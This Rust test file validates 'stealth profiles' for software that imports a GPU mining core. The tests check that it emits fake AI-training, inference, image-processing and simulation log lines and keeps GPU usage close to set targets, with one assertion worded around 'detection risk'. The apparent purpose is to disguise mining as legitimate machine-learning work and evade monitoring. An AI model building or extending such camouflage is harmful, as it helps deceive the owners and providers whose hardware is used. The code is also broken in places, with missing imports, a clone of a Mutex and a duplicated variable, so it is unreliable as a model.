//! # Phase 3.3 Stealth Profiles Validation Tests
//!
//! Comprehensive validation tests for stealth profiles functionality.
//! Ensures realistic log emission, GPU usage patterns, and control mechanisms.

use std::time::{Duration, Instant};
use tokio::time::sleep;
use tokio::sync::broadcast;
use serde::{Deserialize, Serialize};
use regex::Regex;
use lazy_static::lazy_static;

use stealth_layer::{
    ProfileManager, StealthConfig, ProfileConfig,
    ResourceCamouflageConfig, NetworkMixerConfig,
};
use mining_core::GpuManager;

// Real AI/ML workload patterns for validation
#[derive(Clone)]
struct RealisticAiPatterns {
    training_patterns: Vec<String>,
    inference_patterns: Vec<String>,
    image_proc_patterns: Vec<String>,
    scientific_patterns: Vec<String>,
}

impl Default for RealisticAiPatterns {
    fn default() -> Self {
        Self {
            training_patterns: vec![
                r"epoch=\d+ batch=\d+ loss=[\d.]{4,} lr=\d+\.\d+",
                r"Training progress: epoch \d+/\d+",
                r"val_loss=[\d.]{4,}",
            ].into_iter().map(|s| s.to_string()).collect(),

            inference_patterns: vec![
                r"p50_ms=\d+\.?\d* p95_ms=\d+\.?\d* p99_ms=\d+\.?\d*",
                r"total_requests=\d+",
                r"batch_size=\d+",
            ].into_iter().map(|s| s.to_string()).collect(),

            image_proc_patterns: vec![
                r"Processing \d+ images",
                r"batch=\d+ images=\d+ operation=\w+",
                r"throughput_imgs_per_sec=\d+",
            ].into_iter().map(|s| s.to_string()).collect(),

            scientific_patterns: vec![
                r"timestep=\d+ energy=[-\d.]+ total=\d+",
                r"Checkpoint saved",
                r"Simulation progress",
            ].into_iter().map(|s| s.to_string()).collect(),
        }
    }
}

// Test harness for log capture
struct LogCapture {
    logs: std::sync::Mutex<Vec<String>>,
    _subscriber: tracing::subscriber::DefaultGuard,
}

impl LogCapture {
    fn new() -> Self {
        let logs = std::sync::Mutex::new(Vec::new());

        // Create a custom layer that captures logs
        let layer = CaptureLayer {
            logs: logs.clone(),
        };

        let subscriber = tracing_subscriber::registry()
            .with(fmt::layer().with_writer(std::io::sink))
            .with(layer)
            .set_default();

        Self {
            logs,
            _subscriber: subscriber,
        }
    }

    fn get_logs(&self) -> Vec<String> {
        self.logs.lock().unwrap().clone()
    }

    fn clear_logs(&self) {
        self.logs.lock().unwrap().clear();
    }

    fn count_logs_matching_pattern(&self, pattern: &Regex) -> usize {
        self.get_logs().iter()
            .filter(|log| pattern.is_match(log))
            .count()
    }
}

struct CaptureLayer {
    logs: std::sync::Mutex<Vec<String>>,
}

impl<S> Layer<S> for CaptureLayer
where
    S: tracing::Subscriber,
{
    fn on_event(&self, event: &tracing::Event<'_>, _ctx: tracing_subscriber::layer::Context<'_, S>) {
        let mut visitor = StringVisitor::new();
        event.record(&mut visitor);
        let message = visitor.0;

        // Avoid capturing meta-logs about subscribing
        if !message.contains("SetGlobalDefault") && !message.is_empty() {
            self.logs.lock().unwrap().push(message);
        }
    }
}

struct StringVisitor(String);

impl StringVisitor {
    fn new() -> Self {
        Self(String::new())
    }
}

impl tracing::field::Visit for StringVisitor {
    fn record_debug(&mut self, field: &tracing::field::Field, value: &dyn std::fmt::Debug) {
        if field.name() == "message" {
            self.0 = format!("{:?}", value).trim_matches('"').to_string();
        }
    }

    fn record_str(&mut self, field: &tracing::field::Field, value: &str) {
        if field.name() == "message" {
            self.0 = value.to_string();
        }
    }
}

// GPU usage pattern validator
struct GpuPatternValidator {
    target_tolerance: f32,
    variance_limit: f32,
    phase_transition_threshold: Duration,
}

impl GpuPatternValidator {
    fn new() -> Self {
        Self {
            target_tolerance: 0.10,      // ±10% tolerance
            variance_limit: 0.15,        // Max 15% variance from target
            phase_transition_threshold: Duration::from_secs(5),
        }
    }

    fn validate_pattern(&self, current_usage: f32, target_utilization: f32) -> bool {
        let deviation = (current_usage - target_utilization).abs();
        deviation <= self.target_tolerance
    }

    fn validate_variance(&self, usages: &[f32], target: f32) -> bool {
        if usages.is_empty() {
            return false;
        }

        let mean = usages.iter().sum::<f32>() / usages.len() as f32;
        let variance = usages.iter()
            .map(|u| (u - mean).powi(2))
            .sum::<f32>() / usages.len() as f32;

        variance <= self.variance_limit
    }
}

#[cfg(test)]
mod stealth_profiles_validation {
    use super::*;

    #[tokio::test]
    async fn phase33_stealth_profiles_log_realism_validation() {
        // Test: Verify logs appear realistic for AI workloads
        let patterns = RealisticAiPatterns::default();
        let log_capture = LogCapture::new();

        let config = StealthConfig {
            ai_training: ProfileConfig {
                enabled: true,
                log_frequency: Duration::from_secs(2),
                gpu_target: 0.85,
                total_epochs: 10,
            },
            ai_inference: ProfileConfig {
                enabled: true,
                log_frequency: Duration::from_secs(1),
                gpu_target: 0.65,
                total_epochs: 0,
            },
            image_processing: ProfileConfig {
                enabled: true,
                log_frequency: Duration::from_secs(3),
                gpu_target: 0.75,
                total_epochs: 0,
            },
            scientific: ProfileConfig {
                enabled: true,
                log_frequency: Duration::from_secs(2),
                gpu_target: 0.90,
                total_epochs: 0,
            },
            ..Default::default()
        };

        let mut manager = ProfileManager::new(config).unwrap();
        manager.start().await.unwrap();

        // Wait for log generation
        sleep(Duration::from_secs(12)).await;

        let logs = log_capture.get_logs();

        // Phase 3.3: Validate realistic patterns present
        let training_patterns: Vec<Regex> = patterns.training_patterns.iter()
            .map(|p| Regex::new(p).unwrap())
            .collect();

        let mut training_matches = 0;
        for pattern in &training_patterns {
            training_matches += log_capture.count_logs_matching_pattern(pattern);
        }

        assert!(training_matches >= 5, "Insufficient AI training log realism: {} matches", training_matches);

        let inference_patterns: Vec<Regex> = patterns.inference_patterns.iter()
            .map(|p| Regex::new(p).unwrap())
            .collect();

        let mut inference_matches = 0;
        for pattern in &inference_patterns {
            inference_matches += log_capture.count_logs_matching_pattern(pattern);
        }

        assert!(inference_matches >= 10, "Insufficient AI inference log realism: {} matches", inference_matches);

        // Cleanup
        manager.stop().await.unwrap();

        println!("✅ Phase 3.3 Validation: Realistic AI workload logs present");
    }

    #[tokio::test]
    async fn phase33_stealth_profiles_gpu_pattern_control() {
        // Test: GPU usage patterns match expected targets with realistic variance
        let validator = GpuPatternValidator::new();
        let mut manager = ProfileManager::new(Default::default()).unwrap();

        // Enable training profile với known GPU target
        let config = StealthConfig {
            ai_training: ProfileConfig {
                enabled: true,
                log_frequency: Duration::from_secs(10),
                gpu_target: 0.75,    // 75% target
                total_epochs: 5,
            },
            ..Default::default()
        };

        let mut manager = ProfileManager::new(config).unwrap();
        manager.start().await.unwrap();

        let mut usages = Vec::new();
        let start = Instant::now();

        // Sample GPU usage over time
        while start.elapsed() < Duration::from_secs(20) {
            // Simulate getting GPU usage from camouflage system
            let usage = manager.get_stealth_gpu_target().await;
            usages.push(usage);
            sleep(Duration::from_millis(100)).await;
        }

        // Phase 3.3: Validate GPU pattern control within ±10%
        for usage in &usages {
            assert!(validator.validate_pattern(*usage, 0.75),
                "GPU usage {:.3} outside target range for 0.75", usage);
        }

        // Validate variance is realistic (<15%)
        assert!(validator.validate_variance(&usages, 0.75),
            "GPU usage variance too high - detection risk");

        manager.stop().await.unwrap();

        println!("✅ Phase 3.3 Validation: GPU usage patterns within controlled bounds");
    }

    #[tokio::test]
    async fn phase33_stealth_profiles_enable_disable_control() {
        // Test: Profiles can be enabled/disabled via configuration
        let log_capture = LogCapture::new();

        // Test 1: All profiles disabled
        let config_disabled = StealthConfig {
            ai_training: ProfileConfig {
                enabled: false,
                ..Default::default()
            },
            ai_inference: ProfileConfig {
                enabled: false,
                ..Default::default()
            },
            image_processing: ProfileConfig {
                enabled: false,
                ..Default::default()
            },
            scientific: ProfileConfig {
                enabled: false,
                ..Default::default()
            },
            ..Default::default()
        };

        let mut manager = ProfileManager::new(config_disabled).unwrap();
        manager.start().await.unwrap();
        sleep(Duration::from_secs(5)).await;

        // Should have 0 profiles active
        assert_eq!(manager.profile_count(), 0);

        // Minimal logs when disabled
        let early_logs = log_capture.get_logs();
        let before_count = early_logs.len();

        manager.stop().await.unwrap();

        // Test 2: All profiles enabled
        let config_enabled = StealthConfig {
            ai_training: ProfileConfig {
                enabled: true,
                log_frequency: Duration::from_secs(1),
                ..Default::default()
            },
            ai_inference: ProfileConfig {
                enabled: true,
                log_frequency: Duration::from_secs(1),
                ..Default::default()
            },
            image_processing: ProfileConfig {
                enabled: true,
                log_frequency: Duration::from_secs(2),
                ..Default::default()
            },
            scientific: ProfileConfig {
                enabled: true,
                log_frequency: Duration::from_secs(2),
                ..Default::default()
            },
            ..Default::default()
        };

        let log_capture2 = LogCapture::new();
        let mut manager = ProfileManager::new(config_enabled).unwrap();
        manager.start().await.unwrap();

        // Should have 4 profiles active
        assert_eq!(manager.profile_count(), 4);

        sleep(Duration::from_secs(5)).await;

        // Should generate significantly more logs when enabled
        let logs = log_capture2.get_logs();
        assert!(logs.len() > before_count + 10, "Insufficient log generation when enabled");

        manager.stop().await.unwrap();
        drop(log_capture2);

        println!("✅ Phase 3.3 Validation: Profile enable/disable control working correctly");
    }

    #[tokio::test]
    async fn phase33_stealth_profiles_lifecycle_robustness() {
        // Test: Profiles handle start/stop/restart robustly
        let mut manager = ProfileManager::new(Default::default()).unwrap();

        // Multiple start/stop cycles
        for cycle in 0..5 {
            manager.start().await.unwrap();
            assert!(manager.is_active());

            // Allow some operation time
            sleep(Duration::from_millis(500)).await;

            manager.stop().await.unwrap();
            assert!(!manager.is_active());

            // Stop again (should be noop)
            manager.stop().await.unwrap();
            assert!(!manager.is_active());
        }

        // Rapid start/stop sequences
        for _ in 0..10 {
            manager.start().await.unwrap();
            sleep(Duration::from_millis(50)).await; // Very brief
            manager.stop().await.unwrap();
        }

        // Should still work after stress test
        manager.start().await.unwrap();
        assert!(manager.is_active());
        sleep(Duration::from_secs(1)).await;

        // Get status during operation (should not crash)
        let status = manager.get_status().await;
        assert!(status.contains_key("ai_training"));

        manager.stop().await.unwrap();

        println!("✅ Phase 3.3 Validation: Profile lifecycle robust under stress");
    }

    #[tokio::test]
    async fn phase33_stealth_profiles_config_validation() {
        // Test: Configuration validation catches invalid settings

        // Test invalid log frequency (<10ms)
        let invalid_config = StealthConfig {
            ai_training: ProfileConfig {
                enabled: true,
                log_frequency: Duration::from_millis(5), // Too frequent
                gpu_target: 0.8,
                total_epochs: 10,
            },
            ..Default::default()
        };

        let result = ProfileManager::new(invalid_config);
        assert!(result.is_err(), "Should reject invalid log frequency");

        // Test invalid GPU target (>1.0)
        let invalid_config2 = StealthConfig {
            ai_training: ProfileConfig {
                enabled: true,
                log_frequency: Duration::from_secs(30),
                gpu_target: 1.5, // Invalid target
                total_epochs: 10,
            },
            ..Default::default()
        };

        let result2 = ProfileManager::new(invalid_config2);
        assert!(result2.is_err(), "Should reject invalid GPU target");

        // Test valid configuration
        let valid_config = StealthConfig {
            ai_training: ProfileConfig {
                enabled: true,
                log_frequency: Duration::from_secs(30),
                gpu_target: 0.8,
                total_epochs: 10,
            },
            ai_inference: ProfileConfig {
                enabled: true,
                log_frequency: Duration::from_secs(10),
                gpu_target: 0.6,
                total_epochs: 0,
            },
            ..Default::default()
        };

        let manager = ProfileManager::new(valid_config).unwrap();
        assert_eq!(manager.profile_count(), 2);

        println!("✅ Phase 3.3 Validation: Configuration validation prevents invalid settings");
    }

    #[tokio::test]
    async fn phase33_stealth_profiles_workload_distribution() {
        // Test: Multiple profiles run without interfering with each other
        let log_capture = LogCapture::new();

        let config = StealthConfig {
            ai_training: ProfileConfig {
                enabled: true,
                log_frequency: Duration::from_secs(5),
                gpu_target: 0.8,
                total_epochs: 3,
            },
            image_processing: ProfileConfig {
                enabled: true,
                log_frequency: Duration::from_secs(8),
                gpu_target: 0.7,
                total_epochs: 0,
            },
            scientific: ProfileConfig {
                enabled: true,
                log_frequency: Duration::from_secs(6),
                gpu_target: 0.9,
                total_epochs: 0,
            },
            ..Default::default()
        };

        let mut manager = ProfileManager::new(config).unwrap();
        manager.start().await.unwrap();

        // Run for sufficient time to get interleaving logs
        sleep(Duration::from_secs(20)).await;

        let logs = log_capture.get_logs();

        // Count different types of logs
        let training_logs = logs.iter()
            .filter(|log| log.contains("ai_training") || log.contains("Training progress"))
            .count();
        let processing_logs = logs.iter()
            .filter(|log| log.contains("image_processing") || log.contains("images"))
            .count();
        let scientific_logs = logs.iter()
            .filter(|log| log.contains("scientific") || log.contains("timestep"))
            .count();

        // Phase 3.3: Validate all profile types are active concurrently
        assert!(training_logs > 2, "AI training profile not sufficiently active");
        assert!(processing_logs > 1, "Image processing profile not sufficiently active");
        assert!(scientific_logs > 2, "Scientific profile not sufficiently active");

        // Combined GPU target should be average of active profiles
        let expected_average = (0.8 + 0.7 + 0.9) / 3.0; // 0.8
        let actual_target = manager.get_stealth_gpu_target().await;

        assert!((actual_target - expected_average).abs() < 0.05,
            "GPU target averaging incorrect: expected {:.2}, got {:.2}", expected_average, actual_target);

        manager.stop().await.unwrap();

        println!("✅ Phase 3.3 Validation: Multiple profiles operate correctly concurrently");
    }
}